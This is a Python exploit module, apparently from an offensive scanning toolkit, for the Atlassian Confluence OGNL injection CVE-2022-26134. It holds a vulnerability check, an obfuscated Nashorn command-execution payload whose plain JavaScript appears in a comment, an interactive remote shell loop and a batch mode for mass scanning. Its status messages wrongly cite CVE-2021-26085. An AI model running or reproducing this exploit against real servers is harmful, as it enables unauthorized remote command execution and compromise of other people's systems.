# body="./images/lg_05_1.gif"
import urllib.parse
import urllib3
import base64
import requests as req
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class Cve_2022_26134:
	def poc(self,target: str) -> bool:
		ognl_expr = """${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("X-Confluence",1)}"""
		payload = "/%s/" % (ognl_expr)
		try:
			resp = req.get(target + "/%s/" % (urllib.parse.quote(payload)), verify=self.ssl,proxies=self.proxy,headers=self.headers, allow_redirects=False)
			return True if "X-Confluence" in resp.headers.keys() else False
		except Exception as e:
			return False


	def exp(self,target: str, cmd: str) -> str:
		ognl_expr = """${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("X-Confluence",Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("eval(String.fromCharCode(118,97,114,32,114,101,113,61,80,97,99,107,97,103,101,115,46,99,111,109,46,111,112,101,110,115,121,109,112,104,111,110,121,46,119,101,98,119,111,114,107,46,83,101,114,118,108,101,116,65,99,116,105,111,110,67,111,110,116,101,120,116,46,103,101,116,82,101,113,117,101,115,116,40,41,59,13,10,118,97,114,32,99,109,100,61,114,101,113,46,103,101,116,80,97,114,97,109,101,116,101,114,40,34,115,101,97,114,99,104,34,41,59,13,10,118,97,114,32,114,117,110,116,105,109,101,61,80,97,99,107,97,103,101,115,46,106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101,46,103,101,116,82,117,110,116,105,109,101,40,41,59,13,10,118,97,114,32,101,110,99,111,100,101,114,61,80,97,99,107,97,103,101,115,46,106,97,118,97,46,117,116,105,108,46,66,97,115,101,54,52,46,103,101,116,69,110,99,111,100,101,114,40,41,59,13,10,101,110,99,111,100,101,114,46,101,110,99,111,100,101,84,111,83,116,114,105,110,103,40,110,101,119,32,80,97,99,107,97,103,101,115,46,106,97,118,97,46,117,116,105,108,46,83,99,97,110,110,101,114,40,114,117,110,116,105,109,101,46,101,120,101,99,40,99,109,100,41,46,103,101,116,73,110,112,117,116,83,116,114,101,97,109,40,41,41,46,117,115,101,68,101,108,105,109,105,116,101,114,40,34,92,92,65,34,41,46,110,101,120,116,40,41,46,103,101,116,66,121,116,101,115,40,41,41))"))}"""
		"""
		js code:
		var req=Packages.com.opensymphony.webwork.ServletActionContext.getRequest();
		var cmd=req.getParameter("search");
		var runtime=Packages.java.lang.Runtime.getRuntime();
		var encoder=Packages.java.util.Base64.getEncoder();
		encoder.encodeToString(new Packages.java.util.Scanner(runtime.exec(cmd).getInputStream()).useDelimiter("\\A").next().getBytes())
		"""
		payload = "/%s/" % (ognl_expr)
		params = {
			'search': cmd
		}
		resp = req.get(target + "/%s/" % (urllib.parse.quote(payload)), params=params, verify=self.ssl,proxies=self.proxy,headers=self.headers,
					   allow_redirects=False)
		return base64.b64decode(resp.headers.get("X-Confluence", "")).decode()


	def main(self, target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		header = target["header"]
		proxy = target["proxy"]
		self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
		if not self.batch:
			OutPrintInfo("Atlassian", '开始执行Atlassian Confluence CVE-2021-26085漏洞...')
			OutPrintInfo("Atlassian", f"Target: {url}")
			OutPrintInfo("Atlassian", "Checking target is vul...")
		if not self.poc(url):
			if not self.batch:
				OutPrintInfo("Atlassian", f"{url} is not vul.")
			return
		else:
			OutPrintInfoSuc("Atlassian", f"{url} is vul!!!")
			if self.batch:
				OutPutFile("atlassian_2022_26134",f"{url} is vul!!!")
		if not self.batch:
			while True:
				command = input("$ ")
				if command == 'exit':
					OutPrintInfo("Atlassian", "quit.")
					break
				else:
					OutPrintInfo("Atlassian", f"Execute command: {command}")
					print(self.exp(url, command))
		if not self.batch:
			OutPrintInfo("Atlassian", 'Atlassian Confluence CVE-2021-26085漏洞检测结束')



